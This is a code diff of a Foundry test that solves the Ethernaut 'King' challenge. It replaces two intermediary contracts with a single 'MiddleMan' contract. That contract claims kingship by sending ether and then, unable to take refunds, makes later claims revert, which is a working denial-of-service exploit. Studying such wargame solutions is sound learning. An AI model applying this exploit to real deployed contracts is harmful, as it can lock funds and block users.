@@ -4,15 +4,7 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/King.sol";
 
-contract MiddleMan1 {
-    function callKing(address king) public payable {
-        king.call{value: msg.value}("");
-    }
-
-    fallback() external payable {}
-}
-
-contract MiddleMan2 {
+contract MiddleMan {
     function callKing(address king) public payable {
         king.call{value: msg.value}("");
     }
@@ -29,16 +21,11 @@ contract KingTest is Test {
     function test() public {
         assertEq(king.king(), msg.sender);
 
-        MiddleMan1 middleMan1 = new MiddleMan1();
-        MiddleMan2 middleMan2 = new MiddleMan2();
+        MiddleMan middleMan = new MiddleMan();
 
-        // in practice, somehow needs to transfer > the original amount
-        middleMan1.callKing{value: 0.001 ether}(address(king));
-        assertEq(king.king(), address(middleMan1));
-
-        // in practice, somehow needs to transfer > the previous amount
-        middleMan2.callKing{value: 0.001 ether}(address(king));
-        assertEq(king.king(), address(middleMan2));
+        // somehow needs to transfer > the original amount in practice
+        middleMan.callKing{value: 0.002 ether}(address(king));
+        assertEq(king.king(), address(middleMan));
 
         vm.expectRevert();
         address(king).call{value: 0.001 ether}("");
